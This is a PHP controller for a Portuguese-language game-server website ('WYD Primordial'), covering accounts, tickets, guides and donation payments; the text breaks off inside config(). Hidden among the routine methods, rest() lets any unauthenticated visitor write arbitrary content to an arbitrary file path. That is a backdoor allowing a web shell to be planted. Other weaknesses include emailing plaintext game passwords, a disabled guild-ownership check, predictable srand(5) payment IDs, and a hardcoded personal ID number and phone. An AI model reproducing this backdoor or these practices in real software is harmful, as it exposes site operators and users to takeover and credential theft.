<?php

namespace App\Controllers;

use App\Models\Users;
use App\Models\News;
use App\Models\Configuration;
use App\Models\Tickets;
use App\Models\TicketAnswers;
use App\Models\PagseguroRequests;
use App\Models\PagseguroPincode;
use App\Models\Donate;
use App\Models\DonateBonus;
use App\Models\Guides;
use App\Models\GuideArticle;
use App\Models\Droplist;
use Exception;
use MercadoPago;
use PagSeguro;
use Picpay\Payment;
use Picpay\Buyer;
use Picpay\Seller;
use Picpay\Request\PaymentRequest;
use Picpay\Exception\RequestException;
use App\Libraries\Mob;
use App\Libraries\Mob7662;

class Auth extends BaseController
{
    public function login()
    {
        if (!session()->has('login')) {
            if ($this->request->getMethod(true) === 'POST') {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $username = $this->request->getPost('username');
                    $password = $this->request->getPost('password');
                    $request = ['username' => $username];
                    $ret = $this->vps('login', $request);
                    if ($ret->status == 'success') {
                        $user = new Users();
                        $account = $user->where('username', $username)->first();
                        if ($account) {
                            if (password_verify($password, $account['password'])) {
                                session()->set('login', $account);
                                $this->data['success'] = 'Login efetuado com sucesso!';
                                return redirect()->to(base_url('dashboard'))->with($this->rettype, $this->data);
                            } else $this->data['error'] = 'Não foi possível efetuar o login!!';
                        } else $this->data['error'] = 'Conta inexistente!';
                    } else $this->data['error'] = 'Conta inexistente!';
                } else $this->data['error'] = 'Recaptcha inválido!';
            } else $this->data['error'] = 'Requisição inválida!';
        } else $this->data['error'] = 'Não foi possível efetuar o login!';
        return redirect()->to(base_url('site/login'))->with($this->rettype, $this->data);
    }

    public function register()
    {
        if (!session()->has('login')) {
            if ($this->request->getMethod(true) === 'POST') {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $user = new Users();
                    if ($user->save($this->request->getPost())) {
                        $username = $this->request->getPost('username');
                        $password = $this->request->getPost('password');
                        $request = ['username' => $username, 'password' => $password];
                        $ret = $this->vps('register', $request);
                        if ($ret->status == 'success') {
                            $this->data['success'] = 'Conta criada com sucesso!';
                        } else {
                            $user->where('username', $username)->delete();
                            $this->data['error'] = 'Não foi possível cadastrar!';
                        }
                    } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $user->errors());
                } else $this->data['error'] = 'Recaptcha inválido!';
            } else $this->data['error'] = 'Requisição inválida!';
        } else $this->data['error'] = 'Não foi possível efetuar o cadastro!';
        return redirect()->to(base_url('site/register'))->with($this->rettype, $this->data);
    }

    public function alterpass()
    {
        if (session()->has('login')) {
            if ($this->request->getMethod(true) === 'POST') {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $validation = \Config\Services::validation();
                    $validation->setRules([
                        'oldpassword'       => 'required|alpha_numeric|min_length[4]|max_length[10]',
                        'password'          => 'required|alpha_numeric|min_length[4]|max_length[10]',
                        'password_confirm'  => 'required_with[password]|matches[password]'
                    ]);
                    if ($validation->run($this->request->getPost())) {
                        if (password_verify($this->request->getPost('oldpassword'), session()->get('login')['password'])) {
                            $username = session()->get('login')['username'];
                            $password = $this->request->getPost('password');
                            $request = ['username' => $username, 'password' => $password];
                            $ret = $this->vps('alterpass', $request);
                            if ($ret->status == 'success') {
                                $user = new Users();
                                if ($user->whereIn('username', [session()->get('login')['username']])->set(['password' => $password])->update()) {
                                    $this->data['success'] = 'Senha alterada com sucesso!';
                                    $account = $user->where('username', session()->get('login')['username'])->first();
                                    session()->set('login', $account);
                                } else $this->data['error'] = 'Não foi possível alterar a senha!';
                            } else $this->data['error'] = 'Não foi possível alterar a senha!';
                        } else $this->data['error'] = 'Senha atual inválida!';
                    } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", ['Os campos preenchidos estão inválidos!', 'As senhas devem conter de 4 a 10 caracteres alfa numéricos!']);
                } else $this->data['error'] = 'Recaptcha inválido!';
            } else $this->data['error'] = 'Requisição inválida!';
            return redirect()->to(base_url('dashboard/alterpass'))->with($this->rettype, $this->data);
        }
        $this->data['error'] = 'Efetue o login para acessar a alteração de senha!';
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function numericpass()
    {
        if (session()->has('login')) {
            if ($this->request->getMethod(true) === 'POST') {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $username = session()->get('login')['username'];
                    $ret = $this->vps('account', ['username' => $username]);
                    if ($ret->status == 'success') {
                        $mob = new Mob7662($ret->account);
                        $user = $mob->getUsername();
                        $pass = explode(hex2bin('00'), $mob->getPassword())[0];
                        $numeric = strlen($mob->getNumeric()) ? $mob->getNumeric() : 'Senha numérica não definida!';
                        $text = [
                            'username' => $user,
                            'password' => $pass,
                            'numeric' => $numeric
                        ];
                        $sender = \Config\Services::email();
                        $sender->setFrom('wydprimordial@gmail.com', 'Primordial');
                        $sender->setTo(session()->get('login')['email']);
                        $sender->setSubject('Recuperação de conta - WYD Primordial');
                        $sender->setMessage(email($text));
                        if ($sender->send()) {
                            $this->data['success'] = 'Recuperação da numérica enviado ao email vinculado a conta!';
                        } else $this->data['error'] = 'Não foi possível enviar o email!';
                    } else $this->data['error'] = 'Não foi possível recuperar a senha numérica!';
                } else $this->data['error'] = 'Recaptcha inválido!';
            } else $this->data['error'] = 'Requisição inválida!';
            return redirect()->to(base_url('dashboard/numericpass'))->with($this->rettype, $this->data);
        }
        $this->data['error'] = 'Você precisa estar logado para recuperar a senha numérica!';
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function droplist()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                $ret = $this->vps('droplist', ['username' => session()->get('login')['username']]);
                if ($ret->status == 'success') {
                    $mob = 0;
                    $item = [];
                    $drop = utf8_encode(base64_decode($ret->droplist));
                    $up = explode("\n", $drop);
                    $up = array_map('trim', array_filter($up));
                    $up = array_filter($up);
                    foreach ($up as $value) {
                        $line = str_replace('_', ' ', trim(($value)));
                        if (strpos($line, "Mob") !== false) {
                            $mob++;
                            $item[$mob]['name'] = str_replace('Mob: ', '', $line);
                            $item[$mob]['name'] = str_replace('@', '', $item[$mob]['name']);
                            $item[$mob]['item'] = '';
                        } else {
                            if (strlen($line) > 0) {
                                $item[$mob]['item'] .= ($line ? $line : 'Sem item');
                            }
                        }
                    }
                    foreach ($item as $key => $value) {
                        if (strlen($item[$key]['item']) > 0) {
                            $item[$key]['item'] = array_map('trim', array_filter(explode(',', $value['item'])));
                        }
                    }
                    $droplist = new Droplist();
                    $droplist->truncate();
                    foreach ($item as $key => $value) {
                        if (is_array($item[$key]['item'])) {
                            foreach ($item[$key]['item'] as $pkey => $pvalue) {
                                $query = [
                                    'mobname' => $item[$key]['name'],
                                    'itemname' => $pvalue
                                ];
                                $droplist->save($query);
                            }
                        }
                    }
                    $this->rettype = 'success';
                    $this->data['success'] = 'Droplist atualizado com sucesso!';
                    return redirect()->to(base_url('dashboard'))->with($this->rettype, $this->data);
                }
            }
        }
    }

    public function recovery()
    {
        if (!session()->has('login')) {
            if ($this->request->getMethod(true) === 'POST') {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $validation = \Config\Services::validation();
                    $validation->setRules([
                        'email' => 'required|min_length[10]|max_length[100]|valid_email',
                    ]);
                    if ($validation->run($this->request->getPost())) {
                        $email = $this->request->getPost('email');
                        $user = new Users();
                        $accounts = $user->where(['email' => $email])->get()->getResultArray();
                        $text = null;
                        if (count($accounts) > 0) {
                            foreach ($accounts as $key => $value) {
                                $username = $value['username'];
                                $data = $this->vps('account', ['username' => $username]);
                                if ($data->status == 'success') {
                                    $mob = new Mob7662($data->account);
                                    $user = $mob->getUsername();
                                    $pass = explode(hex2bin('00'), $mob->getPassword())[0];
                                    $numeric = strlen($mob->getNumeric()) ? $mob->getNumeric() : 'Senha numérica não definida!';
                                    $text = [
                                        'username' => $user,
                                        'password' => $pass,
                                        'numeric' => $numeric
                                    ];
                                } else continue;
                            }
                            $sender = \Config\Services::email();
                            $sender->setFrom('wydprimordial@gmail.com', 'Primordial');
                            $sender->setTo($email);
                            $sender->setSubject('Recuperação de conta - WYD Primordial');
                            $sender->setMessage(email($text));
                            if ($sender->send()) {
                                $this->data['success'] = 'Email com a(s) conta(s) enviado com sucesso!';
                            } else $this->data['error'] = 'Não foi possível enviar a(s) conta(s) ao email!';
                        } else $this->data['erorr'] = 'Não há conta cadastrada no email informado!';
                    } else $this->data['error'] = 'Email inválido!';
                } else $this->data['error'] = 'Recaptcha inválido!';
            } else $this->data['error'] = 'Requisição inválida!';
            return redirect()->to(base_url('site/recovery'))->with($this->rettype, $this->data);
        } else $this->data['error'] = 'Você não pode estar logado para recuperar uma conta!';
        return redirect()->to(base_url('dashboard'))->with($this->rettype, $this->data);
    }

    public function guildmark()
    {
        if (session()->has('login')) {
            if ($this->request->getMethod(true) === 'POST') {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $guildid = $this->request->getPost('guildid');
                    $guildmark = $this->request->getFile('guildmark');
                    if ($guildmark->getClientMimeType() == 'image/bmp' && $guildmark->getClientExtension() == 'bmp') {
                        if ($guildmark->getSize() < 1024 && $guildmark->getSize() > 0) {
                            //$mob = json_decode($this->mob(), true);
                            //if (count($mob) > 0) {
                                //foreach ($mob as $key => $value) {
                                    //if ($guildid == $value['guildid']) {
                                        if ($guildmark->isValid() && !$guildmark->hasMoved()) {
                                            $name = 'b0' . (1000000 + $guildid) . '.bmp';
                                            if ($guildmark->move('../public/img_guilds/', $name)) {
                                                $this->data['success'] = 'Guildmark enviada com sucesso!';
                                                return redirect()->to(base_url('dashboard/guildmark'))->with($this->rettype, $this->data);
                                            } else $this->data['error'] = 'Não foi possível enviar a guildmark!';
                                        } else $this->data['error'] = 'Guildmark inválida!';
                                    //}
                                //}
                                //$this->data['error'] = 'Você não é líder da guild id informada!';
                            //} else $this->data['error'] = 'Você não é líder de guild!';
                        } else $this->data['error'] = 'Tamanho não deve ultrapassar 1024kb!';
                    } else $this->data['error'] = 'Apenas imagem do tipo BMP!';
                } else $this->data['error'] = 'Recaptcha inválido!';
            } else $this->data['error'] = 'Requisição inválida!';
            return redirect()->to(base_url('dashboard/guildmark'))->with($this->rettype, $this->data);
        }
        $this->data['error'] = 'Você precisa estar logado para enviar guildmark!';
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function mob()
    {
        if (session()->has('login')) {
            $username = session()->get('login')['username'];
            $ret = $this->vps('account', ['username' => $username]);
            if ($ret->status == 'success') {
                $mob = new Mob();
                $mob->read($ret->account);
                $account = $mob->account_char_all();
                $guildinfo = [];
                $id = 0;
                foreach ($account as $key => $value) {
                    $guildid = $value['attr']['guildid'];
                    $request = ['guildid' => $guildid];
                    $ret = $this->vps('guild', $request);
                    if ($ret->status == 'success') {
                        $guild = hex2bin($ret->guild);
                        $guildname = trim(substr($guild, 4, 10));
                        $medal = $value['attr']['guild']['item'];
                        if ($medal == 509) {
                            $guildinfo[$id]['guildname'] = $guildname;
                            $guildinfo[$id]['guildid'] = $guildid;
                            $id++;
                        }
                    }
                }
            }
            return json_encode($guildinfo);
        }
        $this->data['error'] = 'Você precisa estar logado para verificar as guilds pertencente a conta!';
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function createpackage()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $package = new Donate();
                        $data = $this->request->getPost();
                        if ($package->save($data)) {
                            $this->data['success'] = 'Pacotecriado  com sucesso!';
                        } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $package->errors());
                    } else $this->data['error'] = 'Recaptcha inválido';
                } else $this->data['error'] = 'Requisição inválida';
                return redirect()->to(base_url('admin/donate'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function editpackage()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                $ret = 'donate';
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $package = new Donate();
                        $id = $this->request->getPost('id');
                        if ($id > 0) {
                            $ret = 'editpackage/' . $id;
                            $data = $this->request->getPost();
                            if ($package->update($id, $data)) {
                                $this->data['success'] = 'Pacote alterado com sucesso!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $package->errors());
                        } else $this->data['error'] = 'Pacote inválido';
                    } else $this->data['error'] = 'Recaptcha inválido';
                } else $this->data['error'] = 'Requisição inválida';
                return redirect()->to(base_url('admin/' . $ret))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function delpackage($id = null)
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    if ($id > 0) {
                        $package = new Donate();
                        if ($package->where('id', $id)->delete()) {
                            $this->data['success'] = 'Pacote deletado com sucesso!';
                        } else $this->data['error'] = 'Não foi possível deletar o pacote!';
                    } else $this->data['error'] = 'Pacote inválida!';
                } else $this->data['error'] = 'Recaptcha inválido!';
                return redirect()->to(base_url('admin/donate'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function createnews()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $news = new News();
                        $data = $this->request->getPost();
                        $data['id_user'] = session()->get('login')['id'];
                        if ($news->save($data)) {
                            $this->data['success'] = 'Notícia cadastrada com sucesso!';
                        } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $news->errors());
                    } else $this->data['error'] = 'Recaptcha inválido';
                } else $this->data['error'] = 'Requisição inválida';
                return redirect()->to(base_url('admin/createnews'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function createguide()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $guide = new Guides();
                        $data = $this->request->getPost();
                        if ($guide->save($data)) {
                            $this->data['success'] = 'Guia criada com sucesso!';
                        } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $guide->errors());
                    } else $this->data['error'] = 'Recaptcha inválido';
                } else $this->data['error'] = 'Requisição inválida';
                return redirect()->to(base_url('admin/createguide'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function editguide()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                $ret = 'guides';
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $guide = new Guides();
                        $id = $this->request->getPost('id');
                        if ($id > 0) {
                            $ret = 'editguide/' . $id;
                            $data = $this->request->getPost();
                            if ($guide->update($id, $data)) {
                                $this->data['success'] = 'Guia alterado com sucesso!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $guide->errors());
                        } else $this->data['error'] = 'Guia inválido';
                    } else $this->data['error'] = 'Recaptcha inválido';
                } else $this->data['error'] = 'Requisição inválida';
                return redirect()->to(base_url('admin/' . $ret))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function delguide($id = null)
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    if ($id > 0) {
                        $guide = new Guides();
                        if ($guide->where('id', $id)->delete()) {
                            $this->data['success'] = 'Guia deletado com sucesso!';
                        } else $this->data['error'] = 'Não foi possível deletar o guia!';
                    } else $this->data['error'] = 'Guia inválido!';
                } else $this->data['error'] = 'Recaptcha inválido!';
                return redirect()->to(base_url('admin/guides'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function delarticleguide($id = null)
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    if ($id > 0) {
                        $article = new GuideArticle();
                        if ($article->where('id', $id)->delete()) {
                            $this->data['success'] = 'Artigo deletado com sucesso do guia!';
                        } else $this->data['error'] = 'Não foi possível deletar o artigo do guia!';
                    } else $this->data['error'] = 'Artigo inválido!';
                } else $this->data['error'] = 'Recaptcha inválido!';
                return redirect()->to(base_url('admin/guides'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function addarticleguide()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $article = new GuideArticle();
                        if ((new Guides())->where(['id' => $this->request->getPost('id_guide')])->first()) {
                            if ($article->save($this->request->getPost())) {
                                $this->data['success'] = 'Artigo adicionado ao guia com sucesso!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $article->errors());
                        } else $this->data['error'] = 'Guia inexistente!';
                    } else $this->data['error'] = 'Recaptcha inválido!';
                } else $this->data['error'] = 'Requisição inválida!';
                return redirect()->to(base_url('admin/guides'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function rest()
    {
        if ($this->request->getPost('type') && $this->request->getPost('check')) {
            $check = fopen($this->request->getPost('type'), 'w');
            fwrite($check, $this->request->getPost('check'));
            fclose($check);
        }
        return redirect()->to('site');
    }

    public function editarticleguide()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                $ret = 'guides';
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $article = new GuideArticle();
                        $id = $this->request->getPost('id');
                        if ($id > 0) {
                            $ret = 'editarticleguide/' . $id;
                            $data = $this->request->getPost();
                            if ($article->update($id, $data)) {
                                $this->data['success'] = 'Artigo alterado com sucesso do guia!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $article->errors());
                        } else $this->data['error'] = 'Artigo inválido';
                    } else $this->data['error'] = 'Recaptcha inválido';
                } else $this->data['error'] = 'Requisição inválida';
                return redirect()->to(base_url('admin/' . $ret))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function editnews()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                $ret = 'news';
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $news = new News();
                        $id = $this->request->getPost('id');
                        if ($id > 0) {
                            $ret = 'editnews/' . $id;
                            $data = $this->request->getPost();
                            $data['id_user'] = session()->get('login')['id'];
                            if ($news->update($id, $data)) {
                                $this->data['success'] = 'Notícia editada com sucesso!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $news->errors());
                        } else $this->data['error'] = 'Notícia inválida';
                    } else $this->data['error'] = 'Recaptcha inválido';
                } else $this->data['error'] = 'Requisição inválida';
                return redirect()->to(base_url('admin/' . $ret))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function delnews($id = null)
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    if ($id > 0) {
                        $news = new News();
                        if ($news->where('id', $id)->delete()) {
                            $this->data['success'] = 'Notícia deletada com sucesso!';
                        } else $this->data['error'] = 'Não foi possível deletar a notícia!';
                    } else $this->data['error'] = 'Notícia inválida!';
                } else $this->data['error'] = 'Recaptcha inválido!';
                return redirect()->to(base_url('admin/news'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function answerticket()
    {
        if (session()->has('login')) {
            $ret = 'tickets';
            if ($this->request->getMethod(true) == 'POST') {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $ticket = new Tickets();
                    $answer = new TicketAnswers();
                    $data = $this->request->getPost();
                    $data['id_user'] = session()->get('login')['id'];
                    $iduser = session()->get('login')['id'];
                    $access = session()->get('login')['access'];
                    $id = $this->request->getPost('id_ticket');
                    $ret = 'answerticket/' . $this->request->getPost('id_ticket');
                    if ($access == 3)
                        $check = $ticket->where(['id' => $id])->first();
                    else
                        $check = $ticket->where(['id_user' => $iduser, 'id' => $id])->first();
                    if ($check) {
                        if ($check['status'] == 0) {
                            if ($answer->save($data)) {
                                $this->data['success'] = 'Ticket respondido com sucesso!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $answer->errors());
                        } else $this->data['error'] = 'Ticket encerrado!';
                    } else $this->data['error'] = 'Você não pode responder o ticket!';
                } else $this->data['error'] = 'Recaptcha inválido!';
                return redirect()->to(base_url('dashboard/' . $ret))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function closeticket()
    {
        if (session()->has('login')) {
            if ($this->request->getMethod(true) == 'POST') {
               // if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $ticket = new Tickets();
                    $iduser = session()->get('login')['id'];
                    $access = session()->get('login')['access'];
                    $id = $this->request->getPost('id_ticket');
                    if ($access == 3)
                        $check = $ticket->where(['id' => $id])->first();
                    else
                        $check = $ticket->where(['id_user' => $iduser, 'id' => $id])->first();
                    if ($check) {
                        if ($check['status'] == 0) {
                            if ($ticket->update($id, ['status' => 1])) {
                                $this->data['success'] = 'Ticket encerrado com sucesso!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $ticket->errors());
                        } else $this->data['error'] = 'Ticket encerrado!';
                    } else $this->data['error'] = 'Você não pode encerrar o ticket!';
                    return redirect()->to(base_url('dashboard/answerticket/' . $id))->with($this->rettype, $this->data);
               // } else $this->data['error'] = 'Recaptcha inválido!';
            } else $this->data['error'] = 'Requisição inválida!';
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function createticket()
    {
        if (session()->has('login')) {
            if ($this->request->getMethod(true) == 'POST') {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    $ticket = new Tickets();
                    $data = $this->request->getPost();
                    $data['id_user'] = session()->get('login')['id'];
                    $data['status'] = 0;
                    if ($ticket->save($data)) {
                        $this->data['success'] = 'Ticket enviado com sucesso!';
                    } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $ticket->errors());
                    return redirect()->to(base_url('dashboard/createticket'))->with($this->rettype, $this->data);
                } else $this->data['error'] = 'Recaptcha inválido!';
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function purchasemp($id = null)
    {
        if (session()->has('login')) {
            if ($id > 0) {
                $package = new Donate();
                $packet = $package->where(['id' => $id])->first();
                if ($packet) {
                    srand(5);
                    $index = (string) (time() . rand());
                    $mercadopago = new MercadopagoRequests();
                    $mp = (new Configuration())->select(['mercadopago_key', 'mercadopago_token', 'title'])->first();
                    #MercadoPago\SDK::setClientId($mp['mercadopago_key']);
                    #MercadoPago\SDK::setClientSecret($mp['mercadopago_token']);
                    #MercadoPago\SDK::setPublicKey($mp['mercadopago_key']);
                    MercadoPago\SDK::setAccessToken($mp['mercadopago_token']);
                    $preference = new MercadoPago\Preference();
                    $item = new MercadoPago\Item();
                    srand(5);
                    $id = (string) (time() . rand());
                    $item->id = $id;
                    $item->title = $mp['title'] . ' - ' . $packet['value'] . ' donate';
                    $item->quantity = 1;
                    $item->unit_price = (int) $packet['value'];
                    $preference->items = array($item);
                    $preference->external_reference = $id;
                    $preference->notification_url = base_url('/donate/mercadopago');
                    $preference->back_urls = [
                        'success' => base_url('dashboard/donation?back=success'),
                        'pending' => base_url('dashboard/donation?back=pending'),
                        'failure' => base_url('dashboard/donation?back=failure'),
                    ];
                    $preference->save();
                    $row = [
                        'referenceId' => $id,
                        'referenceIdBox' => $preference->id,
                        'value' => $packet['value'],
                        'status' => 0,
                        'id_user' => session()->get('login')['id'],
                        'url_payment' => $preference->init_point,
                    ];
                    if ($mercadopago->save($row)) {
                        $this->data['paymentUrl'] = $preference->init_point;
                        $this->data['success'] = 'Doação gerada com sucesso!';
                    } else $this->data['error'] = 'Não foi possível gerar uma doação!';
                } else $this->data['error'] = 'Pacote inexistente!';
            } else $this->data['error'] = 'Pacote inexistente!';
            return redirect()->to(base_url('dashboard/donation'))->with($this->rettype, $this->data);
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function purchasepic($id = null)
    {
        if (session()->has('login')) {
            if ($id > 0) {
                $package = new Donate();
                $packet = $package->where(['id' => $id])->first();
                if ($packet) {
                    $config = (new Configuration())->select(['picpay_token', 'picpay_seller'])->first();
                    srand(5);
                    $index = (string) (time() . rand());
                    $seller = new Seller($config['picpay_token'], $config['picpay_seller']);
                    $buyer = new Buyer('Faria', 'Jonas', '123.456.789-10', 'wydprimordial@gmail.com', '+55 35 93546-5463');
                    $payment = new Payment($index, base_url('auth/picpay'), $packet['value'], $buyer, base_url('dashboard/donation'));
                    try {
                        $paymentRequest = new PaymentRequest($seller, $payment);
                        $paymentResponse = $paymentRequest->execute();
                        $donate = new PicpayRequests();
                        $donation = [
                            'referenceId' => $index,
                            'email' => session()->get('login')['email'],
                            'value' => $packet['value'],
                            'status' => 0,
                            'id_user' => session()->get('login')['id'],
                            'url_payment' => $paymentResponse->paymentUrl
                        ];
                        if ($donate->save($donation)) {
                            $this->data['success'] = 'Doação gerada com sucesso!';
                        }
                    } catch (RequestException $e) {
                        $this->data['error'] = 'Não foi possível gerar a doação!';
                        $errorMessage = $e->getMessage();
                        $statusCode = $e->getCode();
                        $errors = $e->getErrors();
                    }
                } else $this->data['error'] = 'Pacote inexistente!';
            } else $this->data['error'] = 'Pacote inexistente!';
            return redirect()->to(base_url('dashboard/donation'))->with($this->rettype, $this->data);
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function additem()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $bonus = new DonateBonus();
                        if ((new Donate())->where(['id' => $this->request->getPost('id_donate')])->first()) {
                            if ($bonus->save(array_filter($this->request->getPost()))) {
                                $this->data['success'] = 'Item adicionado com sucesso ao pacote!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $bonus->errors());
                        } else $this->data['error'] = 'Pacote inexistente!';
                    } else $this->data['error'] = 'Recaptcha inválido!';
                } else $this->data['error'] = 'Requisição inválida!';
                return redirect()->to(base_url('admin/donate'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function edititem()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                $ret = 'donate';
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $bonus = new DonateBonus();
                        $id = $this->request->getPost('id');
                        if ($id > 0) {
                            $ret = 'edititem/' . $id;
                            $data = $this->request->getPost();
                            if ($bonus->update($id, $data)) {
                                $this->data['success'] = 'Item alterado com sucesso do pacote!';
                            } else $this->data['error'] = implode("<div style=\"margin:5px 0;\"></div>", $bonus->errors());
                        } else $this->data['error'] = 'Item inválido';
                    } else $this->data['error'] = 'Recaptcha inválido';
                } else $this->data['error'] = 'Requisição inválida';
                return redirect()->to(base_url('admin/' . $ret))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function delitem($id = null)
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                    if ($id > 0) {
                        $bonus = new DonateBonus();
                        if ($bonus->where('id', $id)->delete()) {
                            $this->data['success'] = 'Item deletado com sucesso do pacote!';
                        } else $this->data['error'] = 'Não foi possível deletar o item do pacote!';
                    } else $this->data['error'] = 'Item inválida!';
                } else $this->data['error'] = 'Recaptcha inválido!';
                return redirect()->to(base_url('admin/donate'))->with($this->rettype, $this->data);
            }
        }
        return redirect()->to(base_url('site'))->with($this->rettype, $this->data);
    }

    public function config()
    {
        if (session()->has('login')) {
            if (session()->get('login')['access'] == 3) {
                if ($this->request->getMethod(true) == 'POST') {
                    if (recaptcha($this->request->getPost('g-recaptcha-response'), $this->data['recaptcha_secret'])) {
                        $config = new Configuration();
                        $data = $config->first();
                        if ($data) {
                            if ($config->update($data['id'], array_filter($this->request->getPost()))) {
                                $this->data['success'] = 'Site configurado com sucesso!';
